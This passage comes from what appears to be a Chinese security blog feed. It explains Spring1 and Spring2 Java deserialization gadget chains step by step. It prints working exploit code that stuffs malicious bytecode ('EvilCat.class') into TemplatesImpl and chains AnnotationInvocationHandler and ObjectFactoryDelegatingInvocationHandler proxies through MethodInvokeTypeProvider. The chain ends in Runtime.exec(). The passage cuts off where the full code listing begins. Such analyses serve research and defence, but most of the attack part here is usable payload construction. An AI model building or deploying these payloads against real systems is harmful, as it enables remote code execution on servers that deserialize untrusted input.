Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] classBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;EvilCat.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetByteCodes);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Class&lt;?&gt; Annotation = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationDeclaredConstructor = Annotation.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        annotationDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templates);<br>        Class&lt;?&gt; Aop = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; AopConstructor = Aop.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        AopConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AopInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler)AopConstructor.newInstance(advisedSupport);<br><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">Aopproxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class,<br>                Templates.class&#125;, AopInvocationHandler);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;getType&quot;</span>,Aopproxy);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AnnotationInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationDeclaredConstructor.newInstance(Target.class, hashMap);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, AnnotationInvocationHandler);<br><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; MethodIConstructor = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        MethodIConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> MethodIConstructor.newInstance(typeProviderProxy,Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>),<span class="hljs-number">0</span>);<br>        setFieldValue(objects,<span class="hljs-string">&quot;methodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>            outputStream.writeObject(objects);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x06-链接"><a href="#0x06-链接" class="headerlink" title="0x06 链接"></a>0x06 链接</h2><p><a href="https://su18.org/post/ysoserial-su18-3/#spring2">https://su18.org/post/ysoserial-su18-3/#spring2</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java-gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>spring1-gadget</title>
    <link href="/2023/12/14/spring1-gadget/"/>
    <url>/2023/12/14/spring1-gadget/</url>
    
    <content type="html"><![CDATA[<ol><li>依赖版本</li></ol><p>spring-core : 4.1.4.RELEASE<br>spring-beans : 4.1.4.RELEASE<br>jdk 1.7</p><h2 id="0x01-动态代理-Proxy-java"><a href="#0x01-动态代理-Proxy-java" class="headerlink" title="0x01 动态代理 Proxy.java"></a>0x01 动态代理 Proxy.java</h2><p>JDK提供的一个Proxy.newProxyInstance()创建了一个Hello接口对象。这种没有实现类但是在运行期动态创建了一个接口对象的方式，我们称为动态代码。JDK提供的动态创建接口对象的方式，就叫动态代理。</p><p>java&#x2F;lang&#x2F;reflect&#x2F;Proxy.java</p><p><img src="1700936771829-9603e802-5f80-4c2a-a549-6a495be25c56.png" alt="img"></p><p>三个参数分别是ClassLoader, 要代理的interfaces，和调用的invocationHandler。</p><p>代理后，使用interfaces里面的方法时，会自动调用传入invocationHandler.invoke()方法。相当于在不动源代码的情况下，通过invocationHandler.invoke对原方法的增强。</p><p>知道这点就够了。</p><h2 id="0x02-AnnotationInvocationHandler-java"><a href="#0x02-AnnotationInvocationHandler-java" class="headerlink" title="0x02 AnnotationInvocationHandler.java"></a>0x02 AnnotationInvocationHandler.java</h2><p>sun&#x2F;reflect&#x2F;annotation&#x2F;AnnotationInvocationHandler.java</p><p>通过这个AnnotationInvocationHandler.java 动态代理结合interfaces，然后在反射构造函数传入map，map里面包含interfaces里面的方法名，和一个对象(<strong>map(“方法名”，Object)</strong>)，就可以在invocationHandler.invoke()调用时放回这个<strong>Object，</strong>这就是Spring1这条链的精髓所在<strong>。</strong></p><p><img src="1700937893410-8dbc5a8b-7b81-488e-a7fa-7c4c45914c1e.png" alt="img"></p><p><img src="1700937914135-815c9d15-7551-4c86-afac-96e1bc946ce9.png" alt="img"></p><p><img src="1700937934220-d58a68a8-ae74-468a-9559-d6af8b456278.png" alt="img"></p><p>invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>       Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>       <span class="hljs-comment">// Handle Object and Annotation methods</span><br>       <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>           paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>           <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>       <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>       <span class="hljs-keyword">switch</span>(member) &#123;<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>           <span class="hljs-keyword">return</span> toStringImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>           <span class="hljs-keyword">return</span> hashCodeImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>           <span class="hljs-keyword">return</span> type;<br>       &#125;<br><br>       <span class="hljs-comment">// Handle annotation member accessors</span><br>       <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br><br>       <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br><br>       <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>           <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br><br>       <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>           result = cloneArray(result);<br><br>       <span class="hljs-keyword">return</span> result;<br>   &#125;<br></code></pre></td></tr></table></figure><p>只能说是无敌。</p><h2 id="0x03-MethodInvokeTypeProvider"><a href="#0x03-MethodInvokeTypeProvider" class="headerlink" title="0x03 MethodInvokeTypeProvider"></a>0x03 MethodInvokeTypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider.java</p><p>接下来我们从反序列触发点开始分析。</p><p>readObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>inputStream.defaultReadObject();<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(<span class="hljs-built_in">this</span>.provider.getType().getClass(), <span class="hljs-built_in">this</span>.methodName);<br><span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="hljs-built_in">this</span>.provider.getType());<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="1700938325145-d7d5aee2-c3cf-4343-b7db-dfa471b73006.png" alt="img"></p><p>先在class找对应的方法，然后使用这个方法。调用的方法只能是无参方法。很容易就想到TemplatesImpl.newTransformer()。也就是办法把methodName改为newTransformer，provider.getType().getClass()要得到TemplatesI。</p><h2 id="0x04-TypeProvider"><a href="#0x04-TypeProvider" class="headerlink" title="0x04 TypeProvider"></a>0x04 TypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$TypeProvider</p><p><img src="1700938736196-62c5cd98-c206-43cb-9c64-00bb1622fd67.png" alt="img"></p><p>TypeProvider这个接口刚好有这个方法，可以想到通过AnnotationInvocationHandler.invoke来放回TemplatesI。</p><p>那么就是通过动态代理代理TypeProvider接口，invocationHandler传入AnnotationInvocationHandler，然后通过反射调用构造函数传入map(“geType”，TemplatesI)，在调用接口任意方法就能返回TemplatesI。</p><p>对应的实现代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br><br><span class="hljs-comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span><br>HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map2.put(<span class="hljs-string">&quot;getType&quot;</span>, templates);<br><br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br><span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>cons.setAccessible(<span class="hljs-literal">true</span>);<br>cons.newInstance(typeProviderProxy,TemplatesImpl.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>), <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>调试</p><p><img src="1700940037452-042b5e6e-7cd4-45dd-b0bc-320413010234.png" alt="img"></p><p>可以发现成功返回了TemplatesImpl。</p><p>但是为什么没有加载成功defindclass了。</p><p><img src="1700940133796-e76ec26b-1260-4974-9989-eb495f1ccc93.png" alt="img"></p><p>这里报错，抛出了类型转换错误，TemplatesImpl不能转化为Type类型。那怎么办了？</p><h2 id="0x05-ObjectFactoryDelegatingInvocationHandler"><a href="#0x05-ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="0x05 ObjectFactoryDelegatingInvocationHandler"></a>0x05 ObjectFactoryDelegatingInvocationHandler</h2><p>springframework里面有一个InvocationHandler类。</p><p>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</p><p>构造函数</p><p><img src="1700941320414-0f3be55f-e87a-4f1e-8409-882c75dd6087.png" alt="img"></p><p>objectFactory可控</p><p>invoke方法</p><p><img src="1700941969065-26eddd30-708a-45ff-900b-a3c9ec5bfa21.png" alt="img"></p><p>所以要找一个接口里面有toString或者getObject方法（理论上）。</p><p>这条链子找的是getObject。</p><p><img src="1700942103288-1f40556d-c9ad-47d5-8750-e6bbd8a6e168.png" alt="img"></p><p>然后在ObjectFactoryDelegatingInvocationHandler.invoke，可以结合AnnotationInvocationHandler返回TemplatesImpl。</p><p>对应代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br><br>        <span class="hljs-comment">// 使用动态代理初始化 AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br>        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(<br>                ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler);<br><br>        Class&lt;?&gt;       clazz          = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ofdConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) ofdConstructor.newInstance(factory);<br><br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, ofdHandler);<br><span class="hljs-comment">//        System.out.println(typeProviderProxy);</span><br><br><br>        <span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span><br>        <span class="hljs-comment">// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去</span><br>        cons.newInstance(typeProviderProxy,TemplatesImpl.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>), <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>调试</p><p><img src="1700943894667-6a99d444-3ba0-464d-9bae-6178a334bc7e.png" alt="img"></p><p>可以看见按照预期，接下来应该进入AnnotationInvocationHandler,然后返回TemplatesImpl</p><p>但是还是报错了</p><p><img src="1700944234380-2b8427d3-26f4-41d7-8a78-cdaa1411873f.png" alt="img"></p><p><img src="1700951662980-897b0e97-a3f1-440f-9b29-993fa813c984.png" alt="img"></p><p>显示反射调用的权限问题。</p><p><img src="1700950593525-3c90ee07-e632-4051-87c5-9bff6d50aa22.png" alt="img"></p><p>这个类不能直接实列化。</p><p>所以需要返回这个对象，这里很自然就想起AnnotationInvocationHandler在代理一遍。</p><p>不得不说，世上无难事，有事找大哥，大哥们的花活太强了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br>HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map1.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br><br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map1);<br><br><br>Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br></code></pre></td></tr></table></figure><p><img src="1700951451894-49094428-e93c-4f44-b5f0-8ed8aaa045d2.png" alt="img"></p><p>这样在this.provider.getType()返回一个SerializableTypeWrapper$TypeProvider对象。</p><p>但是需要的是TemplatesImpl类。</p><p>大哥这里是这样处理的，只能说艺术。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-comment">// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler</span><br>        <span class="hljs-comment">// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法</span><br>        <span class="hljs-comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span><br>        <span class="hljs-comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法</span><br><span class="hljs-comment">//        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="hljs-comment">//                new Class[]&#123;Type.class, Templates.class&#125;, ofdHandler);</span><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br></code></pre></td></tr></table></figure><p>这样既满足SerializableTypeWrapper$TypeProvider.getType()，又能找到newTransformer方法，完成触发。</p><h2 id="0x06-完整利用链"><a href="#0x06-完整利用链" class="headerlink" title="0x06 完整利用链"></a>0x06 完整利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>   SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()<br>      SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>         AnnotationInvocationHandler.invoke()<br>            HashMap.get()<br>      ReflectionUtils.findMethod()<br>      SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>         AnnotationInvocationHandler.invoke()<br>            HashMap.get()<br>      ReflectionUtils.invokeMethod()<br>         Method.invoke()<br>            Templates(Proxy).newTransformer()<br>               AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()<br>                  ObjectFactory(Proxy).getObject()<br>                     AnnotationInvocationHandler.invoke()<br>                        HashMap.get()<br>                  Method.invoke()<br>                     TemplatesImpl.newTransformer()<br>                        TemplatesImpl.getTransletInstance()<br>                           TemplatesImpl.defineTransletClasses()<br>                              TemplatesImpl.TransletClassLoader.defineClass()<br>                                 Pwner*(Javassist-generated).&lt;<span class="hljs-keyword">static</span> init&gt;<br>                                    Runtime.exec()<br></code></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span 